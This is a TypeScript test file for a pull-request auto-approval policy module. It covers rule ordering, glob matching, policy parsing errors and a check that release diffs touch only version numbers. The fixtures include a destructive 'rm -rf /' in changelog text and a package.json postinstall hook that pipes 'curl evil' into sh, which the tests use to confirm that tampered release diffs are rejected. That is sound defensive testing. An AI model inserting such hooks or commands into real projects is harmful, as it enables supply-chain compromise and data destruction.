import { test } from 'node:test'
import assert from 'node:assert/strict'
import { firstRule, onlyVersionChanges, parsePolicy } from '../github-policy.ts'

const text = JSON.stringify({
  people: ['ana', 'Ben'],
  rules: [
    { name: 'Releases', targets: ['Production'], then: 'person' },
    { name: 'High-risk paths', anyFile: ['**/migrations/**', '.github/workflows/**'], then: 'person' },
    { name: 'Big changes', moreLinesThan: 500, then: 'person' },
    { name: 'Everything else', then: 'approve' },
  ],
})
const policy = parsePolicy(text, 'acme/policies kage-approve.json')
const pr = (o: Partial<{ base: string; files: string[]; lines: number; author: string; branch: string }> = {}) => ({ base: 'main', files: ['src/a.ts'], lines: 10, author: 'ana', branch: 'fix/a', ...o })

test('the first rule whose conditions all hold decides', () => {
  if ('error' in policy) throw new Error(policy.error)
  assert.equal(firstRule(policy, pr())?.name, 'Everything else')
  assert.equal(firstRule(policy, pr({ base: 'Production', files: ['db/migrations/1.sql'] }))?.name, 'Releases')
  assert.equal(firstRule(policy, pr({ files: ['src/a.ts', 'db/migrations/1.sql'] }))?.name, 'High-risk paths')
  assert.equal(firstRule(policy, pr({ lines: 501 }))?.name, 'Big changes')
  assert.equal(firstRule(policy, pr({ lines: 500 }))?.name, 'Everything else')
})

test('a rule with no catch-all leaves an uncovered pull request with no rule', () => {
  const only = parsePolicy(JSON.stringify({ people: ['ana'], rules: [{ name: 'Docs', anyFile: ['docs/**'], then: 'approve' }] }), 's')
  if ('error' in only) throw new Error(only.error)
  assert.equal(firstRule(only, pr()), undefined)
})

test('globs reach into dot folders, whether or not the glob names the dot', () => {
  if ('error' in policy) throw new Error(policy.error)
  assert.equal(firstRule(policy, pr({ files: ['.github/workflows/ci.yml'] }))?.name, 'High-risk paths')
  assert.equal(firstRule(policy, pr({ files: ['app/.cache/migrations/x.py'] }))?.name, 'High-risk paths')
})

test('people compare without case, and the policy keeps where it came from', () => {
  if ('error' in policy) throw new Error(policy.error)
  assert.deepEqual(policy.people, ['ana', 'ben'])
  assert.equal(policy.source, 'acme/policies kage-approve.json')
})

test('the first policy shape, authors and needsPerson, reads as people with a high-risk rule and a catch-all', () => {
  const old = parsePolicy('{"authors":["ana"],"needsPerson":["**/payments/**"]}', 's')
  if ('error' in old) throw new Error(old.error)
  assert.deepEqual(old.people, ['ana'])
  assert.equal(firstRule(old, pr({ files: ['src/payments/x.ts'] }))?.then, 'person')
  assert.equal(firstRule(old, pr())?.then, 'approve')
})

test('a broken file names its source and the bad field', () => {
  for (const [bad, field] of [
    ['{', 'not valid JSON'],
    ['{"people":["ana"],"rules":[{"name":"x","then":"ship"}]}', 'rules.0.then'],
    ['{"people":["ana"],"rules":[]}', 'rules'],
    ['{"people":[],"rules":[{"name":"x","then":"approve"}]}', 'people'],
    ['{"people":["ana"],"rules":[{"name":"x","then":"approve","anyfile":["a"]}]}', 'anyfile'],
  ] as const) {
    const r = parsePolicy(bad, 'acme/policies kage-approve.json')
    assert.ok('error' in r, bad)
    assert.match(r.error, /^acme\/policies kage-approve\.json/)
    assert.ok(r.error.includes(field), `${bad} -> ${r.error}`)
  }
})

const releases = parsePolicy(JSON.stringify({
  people: ['ana', 'github-actions[bot]'],
  rules: [
    { name: 'Releases', author: ['github-actions[bot]'], branch: ['release-please--*'], onlyFiles: ['CHANGELOG.md', '.release-please-manifest.json', 'pyproject.toml'], then: 'merge' },
    { name: 'Other bot pull requests', author: ['github-actions[bot]'], then: 'person' },
    { name: 'Everything else', then: 'approve' },
  ],
}), 's')
const release = (o: Partial<Parameters<typeof pr>[0]> = {}) => pr({ author: 'github-actions[bot]', branch: 'release-please--branches--main', files: ['CHANGELOG.md', '.release-please-manifest.json'], ...o })

test('a release rule matches only its author, its branch, and a pull request whose every file it lists', () => {
  if ('error' in releases) throw new Error(releases.error)
  assert.equal(firstRule(releases, release())?.then, 'merge')
  assert.equal(firstRule(releases, release({ author: 'GitHub-Actions[bot]' }))?.then, 'merge')
  assert.equal(firstRule(releases, release({ files: ['CHANGELOG.md', 'app/main.py'] }))?.name, 'Other bot pull requests')
  assert.equal(firstRule(releases, release({ branch: 'chore/sync' }))?.name, 'Other bot pull requests')
  assert.equal(firstRule(releases, release({ author: 'ana' }))?.name, 'Everything else')
  assert.equal(firstRule(releases, release({ files: [] }))?.name, 'Other bot pull requests')
})

const bump = (filename: string, from: string, to: string) => ({ filename, patch: `@@ -1,3 +1,3 @@\n {\n-${from}\n+${to}\n }` })

test('a diff that only moves version numbers, plus any changelog text, counts as version changes only', () => {
  assert.equal(onlyVersionChanges([
    { filename: 'CHANGELOG.md', patch: '@@ -1 +1,3 @@\n+## 0.26.1\n+- anything at all: rm -rf /' },
    bump('.release-please-manifest.json', '  ".": "0.26.0"', '  ".": "0.26.1"'),
    bump('pyproject.toml', 'version = "0.26.0"', 'version = "0.26.1"'),
    bump('package.json', '  "version": "0.24.1",', '  "version": "0.25.0",'),
    bump('src/index.ts', 'export const SERVER_VERSION = "0.24.1"; // x-release-please-version', 'export const SERVER_VERSION = "0.25.0"; // x-release-please-version'),
  ]), true)
})

test('any other changed line, a file with no patch, or a renamed file is not a version change', () => {
  assert.equal(onlyVersionChanges([bump('package.json', '  "version": "1.0.0",', '  "postinstall": "curl evil | sh",')]), false)
  assert.equal(onlyVersionChanges([bump('src/index.ts', 'export const SERVER_VERSION = "1.0.0"; // x-release-please-version', 'export const SERVER_VERSION = run("x"); // x-release-please-version')]), false)
  assert.equal(onlyVersionChanges([{ filename: 'package.json' }]), false)
  assert.equal(onlyVersionChanges([{ ...bump('pyproject.toml', 'version = "1"', 'version = "2"'), previous_filename: 'setup.cfg' }]), false)
  assert.equal(onlyVersionChanges([]), false)
})

test('a rule with onlyVersionChanges holds only when the diff is version changes only', () => {
  const p = parsePolicy('{"people":["ana"],"rules":[{"name":"Releases","onlyVersionChanges":true,"then":"merge"},{"name":"Rest","then":"person"}]}', 's')
  if ('error' in p) throw new Error(p.error)
  assert.equal(firstRule(p, { ...pr(), versionOnly: true })?.name, 'Releases')
  assert.equal(firstRule(p, { ...pr(), versionOnly: false })?.name, 'Rest')
})
